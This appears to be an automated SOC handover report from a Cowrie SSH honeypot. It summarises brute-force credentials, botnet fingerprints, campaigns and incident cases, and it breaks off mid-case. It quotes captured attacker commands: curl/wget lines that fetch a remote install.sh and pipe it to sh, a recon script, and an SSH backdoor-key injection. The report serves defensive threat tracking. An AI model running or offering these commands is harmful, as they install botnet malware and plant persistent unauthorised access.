# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-04 |
| **Generated At** | 2026-08-04T14:24:45Z |
| **Shift Time** | 14:24 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **280** |
| Confirmed Threats | **237** |
| False Positives Filtered | **43** (15.4%) |
| Unique Attacker IPs | **138** |
| Countries of Origin | **32** |
| High Severity Cases | **144** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **136** |
| Malware Samples Analyzed | **3** HIGH · **27** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **176** |
| Unique Credential Pairs | **113** |
| Unique Usernames | **40** |
| Unique Passwords | **94** |
| Successful Auth Pairs | **150** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 76 |
| `support` | 12 |
| `user` | 12 |
| `admin` | 11 |
| `config` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 8 |
| `123456` | 6 |
| `admin` | 6 |
| `135791` | 6 |
| `﻿------fuck------` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 8 |
| `user` | `135791` | 6 |
| `root` | `﻿------fuck------` | 4 |
| `root` | `LeitboGi0ro` | 4 |
| `root` | `smo@@kkklss` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `jvc` | `59.11.42.221` | 2026-08-04T08:55:16 |
| `user1` | `123` | `59.120.8.61` | 2026-08-04T08:55:34 |
| `root` | `apple` | `112.6.11.184` | 2026-08-04T08:58:29 |
| `support` | `support` | `176.53.159.196` | 2026-08-04T09:00:13 |
| `git` | `123456` | `10.0.0.73` | 2026-08-04T09:15:31 |
| `admin` | `admin` | `47.252.16.44` | 2026-08-04T09:19:17 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-04T09:19:18 |
| `support` | `admin123` | `187.8.120.90` | 2026-08-04T09:21:18 |
| `support` | `support` | `10.0.0.73` | 2026-08-04T09:24:52 |
| `user` | `1982` | `61.2.44.54` | 2026-08-04T09:29:56 |
| `user` | `1982` | `60.251.229.144` | 2026-08-04T09:30:10 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-08-04T09:30:43 |
| `git` | `123456` | `2.55.122.202` | 2026-08-04T09:33:06 |
| `root` | `admin01` | `10.0.0.73` | 2026-08-04T09:37:56 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-08-04T09:40:35 |
| `root` | `123@@@` | `144.22.238.238` | 2026-08-04T09:40:35 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-08-04T09:40:38 |
| `user` | `user12345` | `10.0.0.73` | 2026-08-04T09:50:24 |
| `GET /cgi-bin/authLogin.cgi HTTP/1.1` | `Host: 129.80.119.236:23` | `68.183.68.14` | 2026-08-04T10:01:17 |
| `user` | `user12345` | `186.239.41.74` | 2026-08-04T10:07:59 |
| `config` | `3333333` | `10.0.0.73` | 2026-08-04T10:12:41 |
| `user` | `user` | `31.77.227.120` | 2026-08-04T10:13:09 |
| `config` | `3333333` | `218.206.136.24` | 2026-08-04T10:14:08 |
| `config` | `3333333` | `210.0.90.82` | 2026-08-04T10:14:22 |
| `root` | `asasas12` | `10.0.0.73` | 2026-08-04T10:20:36 |
| `ftp` | `admin` | `10.0.0.73` | 2026-08-04T10:24:59 |
| `config` | `3333333` | `60.12.5.190` | 2026-08-04T10:30:47 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2223` | `172.236.228.222` | 2026-08-04T10:31:44 |
| `root` | `---fuck_you----` | `101.96.225.252` | 2026-08-04T10:37:06 |
| `root` | `asasas12` | `203.192.211.180` | 2026-08-04T10:39:44 |
| `support` | `support123` | `10.0.0.73` | 2026-08-04T10:47:18 |
| `user` | `135791` | `185.15.189.232` | 2026-08-04T10:47:59 |
| `user` | `135791` | `178.214.160.4` | 2026-08-04T10:48:06 |
| `support` | `support123` | `219.89.206.236` | 2026-08-04T10:48:56 |
| `support` | `support123` | `111.70.7.189` | 2026-08-04T10:49:05 |
| `ts3server` | `ts3` | `128.14.225.164` | 2026-08-04T10:51:41 |
| `345gs5662d34` | `345gs5662d34` | `128.14.225.164` | 2026-08-04T10:51:44 |
| `ts3server` | `3245gs5662d34` | `128.14.225.164` | 2026-08-04T10:51:44 |
| `root` | `﻿------fuck------` | `43.226.38.71` | 2026-08-04T10:53:29 |
| `root` | `Ma123456@` | `209.38.121.186` | 2026-08-04T10:54:03 |
| `345gs5662d34` | `345gs5662d34` | `209.38.121.186` | 2026-08-04T10:54:08 |
| `root` | `3245gs5662d34` | `209.38.121.186` | 2026-08-04T10:54:09 |
| `dhis` | `dhis` | `10.0.0.73` | 2026-08-04T10:55:36 |
| `james` | `1234` | `159.203.83.195` | 2026-08-04T10:58:08 |
| `345gs5662d34` | `345gs5662d34` | `159.203.83.195` | 2026-08-04T10:58:10 |
| `james` | `3245gs5662d34` | `159.203.83.195` | 2026-08-04T10:58:10 |
| `user` | `135791` | `10.0.0.73` | 2026-08-04T11:00:03 |
| `root` | `﻿------fuck------` | `117.50.218.37` | 2026-08-04T11:10:14 |
| `dhis` | `dhis` | `156.238.86.2` | 2026-08-04T11:14:42 |
| `root` | `---fuck_you----` | `112.54.222.23` | 2026-08-04T11:17:07 |
| `user` | `135791` | `222.99.52.202` | 2026-08-04T11:17:34 |
| `user` | `135791` | `89.203.142.96` | 2026-08-04T11:17:41 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-04T11:18:45 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-04T11:18:45 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-04T11:18:54 |
| `root` | `P@ssword` | `10.0.0.73` | 2026-08-04T11:22:04 |
| `admin` | `000000` | `217.150.37.249` | 2026-08-04T11:22:48 |
| `root` | `P@ssword` | `61.143.227.17` | 2026-08-04T11:23:37 |
| `gucio` | `gucio` | `190.123.46.136` | 2026-08-04T11:43:44 |
| `345gs5662d34` | `345gs5662d34` | `190.123.46.136` | 2026-08-04T11:43:46 |
| `gucio` | `3245gs5662d34` | `190.123.46.136` | 2026-08-04T11:43:47 |
| `root` | `24051983` | `130.12.182.224` | 2026-08-04T11:51:54 |
| `admin` | `000000` | `122.160.15.31` | 2026-08-04T11:52:22 |
| `admin` | `000000` | `178.178.222.58` | 2026-08-04T11:52:30 |
| `admin` | `admin8` | `10.0.0.73` | 2026-08-04T11:56:46 |
| `root` | `video` | `202.138.229.190` | 2026-08-04T11:57:49 |
| `root` | `admin` | `45.156.87.192` | 2026-08-04T12:02:03 |
| `sol` | `sol` | `2.57.122.238` | 2026-08-04T12:04:36 |
| `solana` | `solana` | `2.57.122.238` | 2026-08-04T12:06:18 |
| `root` | `!root` | `195.178.110.228` | 2026-08-04T12:06:27 |
| `ethdocker` | `ethdocker` | `2.57.122.238` | 2026-08-04T12:07:54 |
| `root` | `111111` | `195.178.110.228` | 2026-08-04T12:08:04 |
| `eth-docker` | `eth-docker` | `2.57.122.238` | 2026-08-04T12:09:30 |
| `root` | `ctj3kk3l` | `45.156.87.192` | 2026-08-04T12:09:39 |
| `root` | `123123` | `195.178.110.228` | 2026-08-04T12:09:42 |
| `root` | `video` | `10.0.0.73` | 2026-08-04T12:09:56 |
| `eth_docker` | `eth_docker` | `2.57.122.238` | 2026-08-04T12:11:08 |
| `root` | `1234` | `195.178.110.228` | 2026-08-04T12:11:22 |
| `root` | `jenny17` | `45.153.34.226` | 2026-08-04T12:11:53 |
| `raydium` | `raydium` | `2.57.122.238` | 2026-08-04T12:12:42 |
| `root` | `12345` | `195.178.110.228` | 2026-08-04T12:13:01 |
| `firedancer` | `firedancer` | `2.57.122.238` | 2026-08-04T12:14:12 |
| `admin` | `admin8` | `218.21.243.58` | 2026-08-04T12:14:58 |
| `node` | `node` | `2.57.122.238` | 2026-08-04T12:15:45 |
| `root` | `12345678` | `195.178.110.228` | 2026-08-04T12:16:27 |
| `node` | `1234` | `2.57.122.238` | 2026-08-04T12:17:22 |
| `root` | `123456789` | `195.178.110.228` | 2026-08-04T12:18:10 |
| `node` | `123456` | `2.57.122.238` | 2026-08-04T12:19:01 |
| `root` | `P@ssw0rd` | `195.178.110.228` | 2026-08-04T12:19:48 |
| `ethereum` | `ethereum` | `2.57.122.238` | 2026-08-04T12:20:37 |
| `root` | `Password1` | `195.178.110.228` | 2026-08-04T12:21:25 |
| `eth` | `eth` | `2.57.122.238` | 2026-08-04T12:22:18 |
| `root` | `Root123` | `195.178.110.228` | 2026-08-04T12:23:01 |
| `polygon` | `polygon` | `2.57.122.238` | 2026-08-04T12:23:59 |
| `test` | `webmaster` | `61.186.136.36` | 2026-08-04T12:24:01 |
| `test` | `webmaster` | `36.137.38.119` | 2026-08-04T12:24:14 |
| `root` | `Dopamina@1234...` | `45.156.87.192` | 2026-08-04T12:24:16 |
| `test` | `webmaster` | `201.63.52.54` | 2026-08-04T12:24:16 |
| `test` | `webmaster` | `218.149.228.138` | 2026-08-04T12:24:26 |
| `root` | `admin` | `195.178.110.228` | 2026-08-04T12:24:41 |
| `tron` | `tron` | `2.57.122.238` | 2026-08-04T12:25:35 |
| `root` | `LeitboGi0ro` | `158.178.141.210` | 2026-08-04T12:25:44 |
| `root` | `123@@@` | `158.178.141.210` | 2026-08-04T12:25:44 |
| `root` | `admin123` | `195.178.110.228` | 2026-08-04T12:26:18 |
| `trx` | `trx` | `2.57.122.238` | 2026-08-04T12:27:08 |
| `root` | `alpine` | `195.178.110.228` | 2026-08-04T12:27:56 |
| `validator` | `ethereum` | `2.57.122.238` | 2026-08-04T12:28:43 |
| `root` | `changeme` | `195.178.110.228` | 2026-08-04T12:29:36 |
| `sepolia` | `sepolia` | `2.57.122.238` | 2026-08-04T12:30:21 |
| `root` | `default` | `195.178.110.228` | 2026-08-04T12:31:18 |
| `root` | `welc0me` | `10.0.0.73` | 2026-08-04T12:31:45 |
| `avalanche` | `avalanche` | `2.57.122.238` | 2026-08-04T12:31:57 |
| `root` | `castaway` | `102.220.160.41` | 2026-08-04T12:32:35 |
| `root` | `letmein` | `195.178.110.228` | 2026-08-04T12:32:57 |
| `root` | `welc0me` | `23.30.11.253` | 2026-08-04T12:33:30 |
| `solv` | `solv` | `2.57.122.238` | 2026-08-04T12:33:32 |
| `root` | `manning` | `45.156.87.182` | 2026-08-04T12:33:33 |
| `sshd` | `sshd` | `45.156.87.192` | 2026-08-04T12:34:12 |
| `root` | `passw0rd` | `195.178.110.228` | 2026-08-04T12:34:35 |
| `solv` | `1234` | `2.57.122.238` | 2026-08-04T12:35:14 |
| `root` | `password` | `195.178.110.228` | 2026-08-04T12:36:13 |
| `myuser` | `password` | `130.12.182.223` | 2026-08-04T12:36:48 |
| `solv` | `123456` | `2.57.122.238` | 2026-08-04T12:36:59 |
| `root` | `aDm8H%MdA` | `130.12.182.225` | 2026-08-04T12:37:24 |
| `root` | `qwerty` | `195.178.110.228` | 2026-08-04T12:37:54 |
| `solv` | `12345678` | `2.57.122.238` | 2026-08-04T12:38:38 |
| `root` | `r00t` | `195.178.110.228` | 2026-08-04T12:39:33 |
| `root` | `Max` | `45.156.87.192` | 2026-08-04T12:40:24 |
| `root` | `Admin@888` | `45.153.34.226` | 2026-08-04T12:40:50 |
| `admin` | `admin` | `94.154.43.231` | 2026-08-04T12:41:46 |
| `root` | `root123` | `195.178.110.228` | 2026-08-04T12:42:56 |
| `ubuntu` | `ubuntu` | `2.57.122.238` | 2026-08-04T12:43:29 |
| `root` | `root@123` | `195.178.110.228` | 2026-08-04T12:44:39 |
| `root` | `pass` | `10.0.0.73` | 2026-08-04T12:44:49 |
| `validator` | `validator` | `2.57.122.238` | 2026-08-04T12:45:05 |
| `root` | `lollie` | `45.156.87.192` | 2026-08-04T12:46:13 |
| `root` | `rootme` | `195.178.110.228` | 2026-08-04T12:46:24 |
| `sol` | `sol123` | `2.57.122.238` | 2026-08-04T12:46:38 |
| `root` | `system` | `195.178.110.228` | 2026-08-04T12:48:14 |
| `sol` | `123` | `2.57.122.238` | 2026-08-04T12:48:21 |
| `server` | `1` | `64.89.161.90` | 2026-08-04T12:49:00 |
| `nagios` | `hunter` | `93.152.221.210` | 2026-08-04T12:49:58 |
| `root` | `toor` | `195.178.110.228` | 2026-08-04T12:50:04 |
| `sol` | `12345678` | `2.57.122.238` | 2026-08-04T12:50:08 |
| `root` | `welc0me` | `183.239.20.236` | 2026-08-04T12:50:08 |
| `root` | `welcome` | `195.178.110.228` | 2026-08-04T12:51:42 |
| `trading` | `trading` | `2.57.122.238` | 2026-08-04T12:51:49 |
| `admin` | `111111` | `195.178.110.228` | 2026-08-04T12:53:21 |
| `trader` | `trader` | `2.57.122.238` | 2026-08-04T12:53:25 |
| `admin` | `123123` | `195.178.110.228` | 2026-08-04T12:54:58 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **280** |
| Sessions with Fingerprint | **18** |
| Unique HASSH Fingerprints | **18** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 77 |
| libssh | 48 |
| OpenSSH | 31 |
| Paramiko (Python) | 11 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 33 | 3 |
| `acaa53e0a7d7...` | Mirai/variant | 31 | 31 |
| `2ec37a7cc8da...` | Mirai/variant | 30 | 1 |
| `a591c4ddccc9...` | Mirai/variant | 16 | 9 |
| `f555226df196...` | Mirai/variant | 12 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 33 | 3 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 31 | 31 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 30 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 18 | 7 | — |
| `a591c4ddccc9...` | libssh | 16 | 9 | Mirai/variant |
| `f555226df196...` | libssh | 12 | 4 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 8 | 2 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **10** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1059.004` |
| **Recon Loader Script** | 🟡 MEDIUM | 28 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
sh
```
```
curl -s http://94.154.43.231:3001/install.sh | sh
```
```
busybox wget -qO- http://94.154.43.231:3001/install.sh | sh
```
```
wget -qO- http://94.154.43.231:3001/install.sh | sh
```
```
/usr/bin/wget -qO- http://94.154.43.231:3001/install.sh | sh
```
Source IPs: `94.154.43.231`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.228`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `209.38.121.186`, `159.203.83.195`, `128.14.225.164`, `190.123.46.136`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **138** |
| Unique ASNs | **85** |
| High-Risk ASNs | **61** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 9 | MEDIUM |
| `AS22773` | Cox Communications Inc. | 8 | MEDIUM |
| `AS48721` | Flyservers S.A. | 5 | HIGH |
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS14061` | DigitalOcean, LLC | 4 | HIGH |
| `AS197170` | TechTies Inc. | 4 | HIGH |
| `AS197769` | VPS Dedicated LLC | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (144)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-0f0a519bc212

| Field | Detail |
|---|---|
| **Source IP** | `59.11.42[.]221` |
| **First Seen** | 2026-08-04 08:55 |
| **Last Seen** | 2026-08-04 08:55 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 08:55:15` | `cowrie.session.connect` |
| `2026-08-04 08:55:16` | `cowrie.login.success` |
| `2026-08-04 08:55:17` | `cowrie.session.params` |
| `2026-08-04 08:55:17` | `cowrie.command.input` |
| `2026-08-04 08:55:17` | `cowrie.command.failed` |
| `2026-08-04 08:55:18` | `cowrie.command.input` |
| `2026-08-04 08:55:18` | `cowrie.command.failed` |
| `2026-08-04 08:55:18` | `cowrie.command.input` |
| `2026-08-04 08:55:18` | `cowrie.command.failed` |
| `2026-08-04 08:55:18` | `cowrie.command.input` |
| `2026-08-04 08:55:18` | `cowrie.command.failed` |
| `2026-08-04 08:55:19` | `cowrie.command.input` |
| `2026-08-04 08:55:19` | `cowrie.command.input` |
| `2026-08-04 08:55:19` | `cowrie.command.failed` |
| `2026-08-04 08:55:19` | `cowrie.command.failed` |
| `2026-08-04 08:55:49` | `cowrie.log.closed` |
| `2026-08-04 08:55:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.11.42[.]221` to AbuseIPDB if not already reported
- [ ] Block `59.11.42[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12ace818022b

| Field | Detail |
|---|---|
| **Source IP** | `59.120.8[.]61` |
| **First Seen** | 2026-08-04 08:55 |
| **Last Seen** | 2026-08-04 08:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 08:55:32` | `cowrie.session.connect` |
| `2026-08-04 08:55:32` | `cowrie.client.version` |
| `2026-08-04 08:55:32` | `cowrie.client.kex` |
| `2026-08-04 08:55:34` | `cowrie.login.success` |
| `2026-08-04 08:55:35` | `cowrie.direct-tcpip.request` |
| `2026-08-04 08:55:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.120.8[.]61` to AbuseIPDB if not already reported
- [ ] Block `59.120.8[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa7d3b8e0042

| Field | Detail |
|---|---|
| **Source IP** | `112.6.11[.]184` |
| **First Seen** | 2026-08-04 08:58 |
| **Last Seen** | 2026-08-04 08:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 08:58:25` | `cowrie.session.connect` |
| `2026-08-04 08:58:26` | `cowrie.client.version` |
| `2026-08-04 08:58:26` | `cowrie.client.kex` |
| `2026-08-04 08:58:29` | `cowrie.login.success` |
| `2026-08-04 08:58:30` | `cowrie.direct-tcpip.request` |
| `2026-08-04 08:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.6.11[.]184` to AbuseIPDB if not already reported
- [ ] Block `112.6.11[.]184` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb7d6c132693

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-04 09:00 |
| **Last Seen** | 2026-08-04 09:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 09:00:12` | `cowrie.session.connect` |
| `2026-08-04 09:00:12` | `cowrie.client.version` |
| `2026-08-04 09:00:13` | `cowrie.client.kex` |
| `2026-08-04 09:00:13` | `cowrie.login.success` |
| `2026-08-04 09:00:13` | `cowrie.direct-tcpip.request` |
| `2026-08-04 09:00:13` | `cowrie.direct-tcpip.data` |
| `2026-08-04 09:00:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e4b8b3049c4

| Field | Detail |
|---|---|
| **Source IP** | `47.252.16[.]44` |
| **First Seen** | 2026-08-04 09:19 |
| **Last Seen** | 2026-08-04 09:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 09:19:17` | `cowrie.session.connect` |
| `2026-08-04 09:19:17` | `cowrie.client.version` |
| `2026-08-04 09:19:17` | `cowrie.client.kex` |
| `2026-08-04 09:19:17` | `cowrie.login.success` |
| `2026-08-04 09:19:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.252.16[.]44` to AbuseIPDB if not already reported
- [ ] Block `47.252.16[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17cc9be8af16

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-04 09:19 |
| **Last Seen** | 2026-08-04 09:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 09:19:18` | `cowrie.session.connect` |
| `2026-08-04 09:19:18` | `cowrie.client.version` |
| `2026-08-04 09:19:18` | `cowrie.client.kex` |
| `2026-08-04 09:19:18` | `cowrie.login.success` |
| `2026-08-04 09:19:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa5cfd399727

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-08-04 09:21 |
| **Last Seen** | 2026-08-04 09:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 09:21:16` | `cowrie.session.connect` |
| `2026-08-04 09:21:16` | `cowrie.client.version` |
| `2026-08-04 09:21:16` | `cowrie.client.kex` |
| `2026-08-04 09:21:18` | `cowrie.login.success` |
| `2026-08-04 09:21:19` | `cowrie.direct-tcpip.request` |
| `2026-08-04 09:21:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5667840aef02

| Field | Detail |
|---|---|
| **Source IP** | `61.2.44[.]54` |
| **First Seen** | 2026-08-04 09:29 |
| **Last Seen** | 2026-08-04 09:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 09:29:54` | `cowrie.session.connect` |
| `2026-08-04 09:29:54` | `cowrie.client.version` |
| `2026-08-04 09:29:54` | `cowrie.client.kex` |
| `2026-08-04 09:29:56` | `cowrie.login.success` |
| `2026-08-04 09:29:57` | `cowrie.direct-tcpip.request` |
| `2026-08-04 09:30:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.2.44[.]54` to AbuseIPDB if not already reported
- [ ] Block `61.2.44[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-029d8c05e3da

| Field | Detail |
|---|---|
| **Source IP** | `60.251.229[.]144` |
| **First Seen** | 2026-08-04 09:30 |
| **Last Seen** | 2026-08-04 09:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 09:30:08` | `cowrie.session.connect` |
| `2026-08-04 09:30:08` | `cowrie.client.version` |
| `2026-08-04 09:30:08` | `cowrie.client.kex` |
| `2026-08-04 09:30:10` | `cowrie.login.success` |
| `2026-08-04 09:30:11` | `cowrie.direct-tcpip.request` |
| `2026-08-04 09:30:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.251.229[.]144` to AbuseIPDB if not already reported
- [ ] Block `60.251.229[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-053be86a15a9

| Field | Detail |
|---|---|
| **Source IP** | `2.55.122[.]202` |
| **First Seen** | 2026-08-04 09:33 |
| **Last Seen** | 2026-08-04 09:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 09:33:04` | `cowrie.session.connect` |
